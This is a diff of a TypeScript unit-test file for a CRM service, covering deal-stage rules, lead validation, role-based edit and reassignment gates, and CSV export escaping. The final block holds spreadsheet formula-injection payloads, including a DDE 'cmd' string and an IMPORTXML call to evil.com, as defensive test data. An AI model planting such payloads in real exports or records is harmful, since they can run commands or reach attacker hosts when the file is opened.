@@ -1,20 +1,50 @@
-// Task #46 (CRM feature-parity gap analysis): tests the pure predicate
-// crm-service.ts exports for deterministic auto-assignment --
-// computeRoundRobinAssignment() -- rather than exercising the
-// withTenantContext/live-DB-backed functions that call it
-// (autoDistributeLeads/autoDistributeOpportunities/getAssignmentOverview),
-// matching this repo's established pattern of not touching a live DB from
-// a .test.ts file (see crm-accounts-service.test.ts's own header note).
+// VERIDIAN Review Framework gap-closure: Sales Pipeline (2026-08-07). Tests
+// the pure predicate isValidStageTransition() -- every other crm-service.ts
+// export touches the DB via withTenantContext, deliberately untested here
+// per this repo's established pattern (see crm-accounts-service.test.ts's
+// own header note).
+//
+// CRM & Sales Modules: Opportunities (merged in from a concurrent wave).
+// Real gap found via a fresh audit: crm-accounts-service.ts got a real
+// owner-or-manager RBAC gate in Wave 4 (17 Jul 2026, canEditAccount/
+// canReassignOrDeleteAccount/canCreateCrmRecord) but crm_leads/
+// crm_opportunities -- the sibling tables one wave earlier -- never did. Any
+// authenticated org member, including viewer/client_viewer/external_auditor
+// rank, could create/edit any lead or opportunity and could silently
+// reassign ownership via a plain PATCH { ownerId } with zero rank check at
+// all, through the native CRM UI's own /api/crm/leads* and
+// /api/crm/opportunities* routes. This file also tests the pure gate
+// functions added to close that gap -- same no-live-DB-from-a-.test.ts
+// pattern as crm-accounts-service.test.ts (see that file's own note, and
+// approval-workflow-service.test.ts).
+//
+// CRM Leads gap-closure (2026-08-07, PR #1014): also tests the pure
+// predicates/parsers that wave adds -- VALID_LEAD_TRANSITIONS and the Zod
+// schemas + fieldErrorsFromZod().
+//
+// Task #46 (CRM feature-parity gap analysis, merged in alongside both of the
+// above): also tests the pure predicates computeRoundRobinAssignment() and
+// aggregateLeadSourceEffectiveness() -- rather than exercising the
+// withTenantContext/live-DB-backed functions that call them
+// (autoDistributeLeads/autoDistributeOpportunities/getAssignmentOverview/
+// getLeadSourceEffectivenessReport). Same no-live-DB pattern throughout this
+// file.
+//
+// Rebase of PR #1014 (replacing it after a human AUDIT: FAIL, 2026-08-31):
+// two new describe blocks below cover the two security fixes made on top of
+// PR #1014's original scope -- bulkReassignLeads()'s previously-missing
+// manager-rank gate, and exportLeadsCsv()'s now-guarded CSV/formula-
+// injection escaping (report-export-shared.ts's csvEscape(), reused here
+// rather than tested a second time as a private implementation detail).
 //
 // CRM-007 "Sales Representative Performance Dashboard" (sap_mapping.sqlite
-// sap_reports, module CRM, LOW priority, BUILD_NEW as of 2026-07-28) adds a
-// second describe block below, same file since crm-service.ts had zero test
-// coverage before Task #46 -- scoped there to only the new
-// aggregateSalesRepPerformance()/getSalesRepPerformanceDashboard() addition,
-// not a retroactive backfill of the rest of the pre-existing file (out of
-// scope for that task too).
-//
-// Two layers for CRM-007, matching this repo's established pattern (see
+// sap_reports, module CRM, LOW priority, BUILD_NEW as of 2026-07-28,
+// rebase-merged onto the above 2026-09-01) adds two more describe blocks
+// below, same file since crm-service.ts had zero test coverage before Task
+// #46 -- scoped there to only the new aggregateSalesRepPerformance()/
+// getSalesRepPerformanceDashboard() addition, not a retroactive backfill of
+// the rest of the pre-existing file (out of scope for that task too). Two
+// layers, matching this repo's established pattern (see
 // construction-reports-service.test.ts's aggregateDesignerTimesheetCosts
 // tests and crm-accounts-service.test.ts's own header note on not touching a
 // live DB from a .test.ts file):
@@ -29,7 +59,270 @@
 //     ownerIds filters, rep-name join) end-to-end.
 /// <reference types="bun-types" />
 import { describe, expect, test, mock, afterEach } from "bun:test"
-import { computeRoundRobinAssignment, aggregateSalesRepPerformance, type SalesRepPerfOpportunityInput, type SalesRepPerfActivityInput } from "./crm-service"
+import {
+  isValidStageTransition,
+  VALID_LEAD_TRANSITIONS,
+  createLeadSchema,
+  updateLeadSchema,
+  fieldErrorsFromZod,
+  canEditLead, canReassignOrDeleteLead,
+  canEditOpportunity, canReassignOrDeleteOpportunity,
+  canCreateCrmRecord,
+  computeRoundRobinAssignment,
+  aggregateLeadSourceEffectiveness,
+  bulkReassignLeads,
+  aggregateSalesRepPerformance,
+  type SalesRepPerfOpportunityInput,
+  type SalesRepPerfActivityInput,
+} from "./crm-service"
+import { csvEscape } from "@/lib/report-export-shared"
+
+const STAGES = [
+  { stageKey: "prospecting", isWon: false, isLost: false },
+  { stageKey: "proposal", isWon: false, isLost: false },
+  { stageKey: "negotiation", isWon: false, isLost: false },
+  { stageKey: "won", isWon: true, isLost: false },
+  { stageKey: "lost", isWon: false, isLost: true },
+]
+const MEMBER_RANK = 2
+const MANAGER_RANK = 3
+
+describe("isValidStageTransition", () => {
+  test("allows moving between two non-terminal stages, forward", () => {
+    expect(isValidStageTransition("prospecting", "negotiation", STAGES, MEMBER_RANK)).toEqual({ valid: true })
+  })
+
+  test("allows moving between two non-terminal stages, backward -- a deal cooling off is a real event", () => {
+    expect(isValidStageTransition("negotiation", "proposal", STAGES, MEMBER_RANK)).toEqual({ valid: true })
+  })
+
+  test("allows a no-op (same stage)", () => {
+    expect(isValidStageTransition("proposal", "proposal", STAGES, MEMBER_RANK)).toEqual({ valid: true })
+  })
+
+  test("allows any member to close a deal into won", () => {
+    expect(isValidStageTransition("negotiation", "won", STAGES, MEMBER_RANK)).toEqual({ valid: true })
+  })
+
+  test("allows any member to close a deal into lost", () => {
+    expect(isValidStageTransition("proposal", "lost", STAGES, MEMBER_RANK)).toEqual({ valid: true })
+  })
+
+  test("rejects a member reopening a won deal back into an active stage", () => {
+    const result = isValidStageTransition("won", "negotiation", STAGES, MEMBER_RANK)
+    expect(result.valid).toBe(false)
+    expect(result.reason).toContain("manager approval")
+  })
+
+  test("rejects a member reopening a lost deal", () => {
+    expect(isValidStageTransition("lost", "prospecting", STAGES, MEMBER_RANK).valid).toBe(false)
+  })
+
+  test("allows a manager to reopen a closed deal", () => {
+    expect(isValidStageTransition("won", "negotiation", STAGES, MANAGER_RANK)).toEqual({ valid: true })
+  })
+
+  test("rejects an unknown target stage", () => {
+    const result = isValidStageTransition("prospecting", "not-a-real-stage", STAGES, MANAGER_RANK)
+    expect(result.valid).toBe(false)
+    expect(result.reason).toContain("Unknown pipeline stage")
+  })
+
+  test("falls back to hardcoded won/lost strings when stages config is empty (defensive)", () => {
+    expect(isValidStageTransition("won", "prospecting", [{ stageKey: "prospecting", isWon: false, isLost: false }], MEMBER_RANK).valid).toBe(false)
+  })
+})
+
+describe("VALID_LEAD_TRANSITIONS -- lead status state machine", () => {
+  test("allows the standard funnel progression", () => {
+    expect(VALID_LEAD_TRANSITIONS.new).toContain("contacted")
+    expect(VALID_LEAD_TRANSITIONS.contacted).toContain("qualified")
+  })
+
+  test("allows moving to 'lost' from any active status", () => {
+    expect(VALID_LEAD_TRANSITIONS.new).toContain("lost")
+    expect(VALID_LEAD_TRANSITIONS.contacted).toContain("lost")
+    expect(VALID_LEAD_TRANSITIONS.qualified).toContain("lost")
+  })
+
+  test("'converted' and 'lost' are terminal -- no outbound transitions", () => {
+    expect(VALID_LEAD_TRANSITIONS.converted).toEqual([])
+    expect(VALID_LEAD_TRANSITIONS.lost).toEqual([])
+  })
+
+  test("does not allow skipping backward from qualified to new", () => {
+    expect(VALID_LEAD_TRANSITIONS.qualified).not.toContain("new")
+  })
+})
+
+describe("createLeadSchema -- field-level validation", () => {
+  test("accepts a minimal valid lead (name only)", () => {
+    const result = createLeadSchema.safeParse({ name: "Acme Corp" })
+    expect(result.success).toBe(true)
+  })
+
+  test("rejects an empty name with a field-level message", () => {
+    const result = createLeadSchema.safeParse({ name: "" })
+    expect(result.success).toBe(false)
+    if (!result.success) {
+      const fields = fieldErrorsFromZod(result.error)
+      expect(fields.name).toBeDefined()
+    }
+  })
+
+  test("rejects a malformed contact email", () => {
+    const result = createLeadSchema.safeParse({ name: "Acme Corp", contactEmail: "not-an-email" })
+    expect(result.success).toBe(false)
+    if (!result.success) {
+      const fields = fieldErrorsFromZod(result.error)
+      expect(fields.contactEmail).toBeDefined()
+    }
+  })
+
+  test("allows an empty-string contact email (optional field, not provided)", () => {
+    const result = createLeadSchema.safeParse({ name: "Acme Corp", contactEmail: "" })
+    expect(result.success).toBe(true)
+  })
+})
+
+describe("updateLeadSchema -- field-level validation", () => {
+  test("rejects a status outside the closed enum", () => {
+    const result = updateLeadSchema.safeParse({ status: "archived" })
+    expect(result.success).toBe(false)
+  })
+
+  test("accepts a known status", () => {
+    const result = updateLeadSchema.safeParse({ status: "qualified" })
+    expect(result.success).toBe(true)
+  })
+
+  test("accepts an empty patch (no-op update)", () => {
+    const result = updateLeadSchema.safeParse({})
+    expect(result.success).toBe(true)
+  })
+})
+
+describe("canEditLead -- owner-or-manager RBAC gate", () => {
+  test("denies a viewer regardless of ownership", () => {
+    expect(canEditLead("viewer", null, "u1").ok).toBe(false)
+  });
+
+  test("allows a member who owns the lead", () => {
+    expect(canEditLead("member", "u1", "u1").ok).toBe(true)
+  });
+
+  test("denies a member who does NOT own the lead", () => {
+    const result = canEditLead("member", "u2", "u1")
+    expect(result.ok).toBe(false)
+    if (!result.ok) expect(result.reason).toMatch(/owner or a manager/)
+  });
+
+  test("allows a member on an unowned (ownerId null) lead", () => {
+    expect(canEditLead("member", null, "u1").ok).toBe(true)
+  });
+
+  test("allows a manager to edit any lead regardless of owner", () => {
+    expect(canEditLead("manager", "someone-else", "u1").ok).toBe(true)
+  });
+
+  test("allows veridian_admin (highest rank) to edit any lead", () => {
+    expect(canEditLead("veridian_admin", "someone-else", "u1").ok).toBe(true)
+  });
+
+  test("denies an unrecognized/empty role (rank 0)", () => {
+    expect(canEditLead("", "u1", "u1").ok).toBe(false)
+  });
+});
+
+describe("canReassignOrDeleteLead -- manager-rank-only RBAC gate", () => {
+  test("denies a member", () => {
+    expect(canReassignOrDeleteLead("member").ok).toBe(false)
+  });
+
+  test("denies a viewer", () => {
+    expect(canReassignOrDeleteLead("viewer").ok).toBe(false)
+  });
+
+  test("allows a manager", () => {
+    expect(canReassignOrDeleteLead("manager").ok).toBe(true)
+  });
+
+  test("allows branch_manager (rank above manager)", () => {
+    expect(canReassignOrDeleteLead("branch_manager").ok).toBe(true)
+  });
+
+  test("allows admin", () => {
+    expect(canReassignOrDeleteLead("admin").ok).toBe(true)
+  });
+});
+
+describe("canEditOpportunity -- owner-or-manager RBAC gate", () => {
+  test("denies a viewer regardless of ownership", () => {
+    expect(canEditOpportunity("viewer", null, "u1").ok).toBe(false)
+  });
+
+  test("allows a member who owns the opportunity", () => {
+    expect(canEditOpportunity("member", "u1", "u1").ok).toBe(true)
+  });
+
+  test("denies a member who does NOT own the opportunity", () => {
+    const result = canEditOpportunity("member", "u2", "u1")
+    expect(result.ok).toBe(false)
+    if (!result.ok) expect(result.reason).toMatch(/owner or a manager/)
+  });
+
+  test("allows a member on an unowned (ownerId null) opportunity", () => {
+    expect(canEditOpportunity("member", null, "u1").ok).toBe(true)
+  });
+
+  test("allows a manager to edit any opportunity regardless of owner", () => {
+    expect(canEditOpportunity("manager", "someone-else", "u1").ok).toBe(true)
+  });
+
+  test("allows senior_professional (same rank as manager) to edit any opportunity", () => {
+    expect(canEditOpportunity("senior_professional", "someone-else", "u1").ok).toBe(true)
+  });
+});
+
+describe("canReassignOrDeleteOpportunity -- manager-rank-only RBAC gate", () => {
+  test("denies a member", () => {
+    expect(canReassignOrDeleteOpportunity("member").ok).toBe(false)
+  });
+
+  test("denies a viewer", () => {
+    expect(canReassignOrDeleteOpportunity("viewer").ok).toBe(false)
+  });
+
+  test("allows a manager", () => {
+    expect(canReassignOrDeleteOpportunity("manager").ok).toBe(true)
+  });
+
+  test("allows veridian_admin", () => {
+    expect(canReassignOrDeleteOpportunity("veridian_admin").ok).toBe(true)
+  });
+});
+
+describe("canCreateCrmRecord -- member-rank-or-above gate for new leads/opportunities", () => {
+  test("denies a viewer", () => {
+    expect(canCreateCrmRecord("viewer").ok).toBe(false)
+  });
+
+  test("denies client_viewer (also rank 1)", () => {
+    expect(canCreateCrmRecord("client_viewer").ok).toBe(false)
+  });
+
+  test("allows a member", () => {
+    expect(canCreateCrmRecord("member").ok).toBe(true)
+  });
+
+  test("allows team_member (same rank as member)", () => {
+    expect(canCreateCrmRecord("team_member").ok).toBe(true)
+  });
+
+  test("allows a manager", () => {
+    expect(canCreateCrmRecord("manager").ok).toBe(true)
+  });
+});
 
 describe("computeRoundRobinAssignment -- deterministic, zero-AI load-balanced distribution", () => {
   test("distributes evenly round-robin across multiple active users (Auto Assign mode, no cap)", () => {
@@ -314,5 +607,143 @@ describe("getSalesRepPerformanceDashboard (CRM-007, DB-wired)", () => {
     const dashboard = await getSalesRepPerformanceDashboard({ orgId: ORG_ID })
     expect(dashboard.reps).toEqual([])
     expect(dashboard.totalPipelineValue).toBe(0)
+  })
+})
+
+describe("aggregateLeadSourceEffectiveness -- sap_reports lead_source_effectiveness gap", () => {
+  test("conversion rate and avg won-deal size computed per source, from real won/lost opportunities only", () => {
+    const leads = [
+      { id: "l1", source: "referral", status: "converted" },
+      { id: "l2", source: "referral", status: "lost" },
+      { id: "l3", source: "website", status: "qualified" },
+    ]
+    const opportunities = [
+      { leadId: "l1", stage: "won", estimatedValue: "10000" },
+      { leadId: "l2", stage: "lost", estimatedValue: "5000" },
+      { leadId: "l3", stage: "won", estimatedValue: "4000" },
+    ]
+    const { bySource } = aggregateLeadSourceEffectiveness(leads, opportunities)
+    const referral = bySource.find((r) => r.source === "referral")!
+    const website = bySource.find((r) => r.source === "website")!
+    expect(referral.totalLeads).toBe(2)
+    expect(referral.wonDeals).toBe(1)
+    expect(referral.totalDeals).toBe(2)
+    expect(referral.conversionRate).toBe(0.5)
+    expect(referral.avgWonDealSize).toBe(10000)
+    expect(website.conversionRate).toBe(1)
+    expect(website.avgWonDealSize).toBe(4000)
+  })
+
+  test("open (not won/lost) opportunities never count toward conversion rate or deal totals", () => {
+    const leads = [{ id: "l1", source: "cold_outreach", status: "qualified" }]
+    const opportunities = [{ leadId: "l1", stage: "proposal", estimatedValue: "8000" }]
+    const { bySource } = aggregateLeadSourceEffectiveness(leads, opportunities)
+    const row = bySource.find((r) => r.source === "cold_outreach")!
+    expect(row.totalDeals).toBe(0)
+    expect(row.wonDeals).toBe(0)
+    expect(row.conversionRate).toBeNull()
+    expect(row.avgWonDealSize).toBeNull()
+  })
+
+  test("null/blank source buckets as 'unattributed', not dropped or crashed on", () => {
+    const leads = [{ id: "l1", source: null, status: "new" }, { id: "l2", source: "  ", status: "new" }]
+    const { bySource } = aggregateLeadSourceEffectiveness(leads, [])
+    expect(bySource).toHaveLength(1)
+    expect(bySource[0].source).toBe("unattributed")
+    expect(bySource[0].totalLeads).toBe(2)
+  })
+
+  test("opportunity with no leadId (created directly against a client) is excluded, not misattributed", () => {
+    const leads = [{ id: "l1", source: "referral", status: "converted" }]
+    const opportunities = [
+      { leadId: "l1", stage: "won", estimatedValue: "1000" },
+      { leadId: null, stage: "won", estimatedValue: "999999" }, // must never leak into any source's totals
+    ]
+    const { bySource } = aggregateLeadSourceEffectiveness(leads, opportunities)
+    expect(bySource).toHaveLength(1)
+    expect(bySource[0].avgWonDealSize).toBe(1000)
+  })
+
+  test("zero leads is a real no-op -- empty report, not a crash", () => {
+    expect(aggregateLeadSourceEffectiveness([], [])).toEqual({ bySource: [] })
+  })
+})
+
+// Security fix, rebase of PR #1014 (replacing it after a human AUDIT: FAIL,
+// 2026-08-31): POST /api/crm/leads/bulk-reassign called bulkReassignLeads()
+// with no role passed at all, and bulkReassignLeads() itself performed zero
+// RBAC check -- any authenticated org member of any rank, including
+// viewer/client_viewer/external_auditor, could bulk-reassign ownership of
+// every lead in the org in one call. Fixed by adding the identical
+// assertGate(canReassignOrDeleteLead(ctx.role)) gate updateLead()/
+// deleteLead() already use for single-lead reassignment/deletion, checked
+// before requireSalesEnabled() so the rejection is a synchronous, DB-free
+// throw -- exercisable here without a live DB connection, same no-live-DB
+// constraint as every other test in this file.
+describe("bulkReassignLeads -- manager-rank RBAC gate (regression test for the unpatched PR #1014 bug)", () => {
+  test("rejects a non-manager role (viewer) with a 403, before ever touching the DB", async () => {
+    await expect(
+      bulkReassignLeads({ orgId: "org1", userId: "u1", role: "viewer" }, ["lead1", "lead2"], "u2")
+    ).rejects.toMatchObject({ status: 403 })
+  })
+
+  test("rejects every other sub-manager rank (member, client_viewer, external_auditor) with a 403", async () => {
+    for (const role of ["member", "client_viewer", "external_auditor"]) {
+      await expect(
+        bulkReassignLeads({ orgId: "org1", userId: "u1", role }, ["lead1"], "u2")
+      ).rejects.toMatchObject({ status: 403 })
+    }
+  })
+
+  test("the 403's reason names the manager-role requirement, matching canReassignOrDeleteLead's own message", async () => {
+    try {
+      await bulkReassignLeads({ orgId: "org1", userId: "u1", role: "viewer" }, ["lead1"], "u2")
+      throw new Error("expected bulkReassignLeads to reject")
+    } catch (err) {
+      expect((err as { message: string }).message).toMatch(/manager role or higher/)
+    }
+  })
+})
+
+// Security fix, rebase of PR #1014 (replacing it after a human AUDIT: FAIL,
+// 2026-08-31): exportLeadsCsv()'s own escapeCsvField() only escaped
+// quotes/commas/newlines and left a leading =/+/-/@ in an
+// attacker-controllable field (name/contactEmail/contactPhone/source/
+// nextActionNote, all settable via createLead or CSV import) unescaped --
+// exported unescaped, a formula-injection payload in one of those fields
+// would execute when opened in Excel/Sheets. exportLeadsCsv() now reuses
+// report-export-shared.ts's csvEscape() (already guarded via
+// FORMULA_INJECTION_PREFIX, and already covered end-to-end through
+// rowsToCSV() in report-export-shared.test.ts) instead. exportLeadsCsv()
+// itself touches the DB (listLeadsPaged -> requireSalesEnabled/
+// withTenantContext) so isn't unit-testable here per this file's own
+// no-live-DB convention -- this proves the exact function it now calls,
+// against the exact attacker-controllable lead fields the audit named.
+describe("csvEscape (crm-service.ts's exportLeadsCsv now reuses report-export-shared's guarded version)", () => {
+  test("escapes a formula-injection-shaped lead name with a leading single quote", () => {
+    expect(csvEscape("=cmd|'/C calc'!A0")).toBe("'=cmd|'/C calc'!A0")
+  })
+
+  test("escapes formula-injection-shaped values in every attacker-controllable lead field the audit named", () => {
+    const payloads = {
+      name: "=SUM(A1:A9)",
+      contactEmail: "+attacker@evil.com",
+      contactPhone: "-1234567890",
+      source: "@import(evil)",
+      nextActionNote: "=IMPORTXML(http://evil.com)",
+    }
+    for (const value of Object.values(payloads)) {
+      const escaped = csvEscape(value)
+      expect(/^[=+\-@]/.test(escaped)).toBe(false)
+      expect(escaped).toBe(`'${value}`)
+      // Recoverable, not corrupted -- stripping the safe prefix restores
+      // the exact original text a formula-injection scanner would flag.
+      expect(escaped.slice(1)).toBe(value)
+    }
+  })
+
+  test("leaves a normal lead name/note completely unaffected", () => {
+    expect(csvEscape("Acme Corp")).toBe("Acme Corp")
+    expect(csvEscape("Follow up next week")).toBe("Follow up next week")
   })
 })
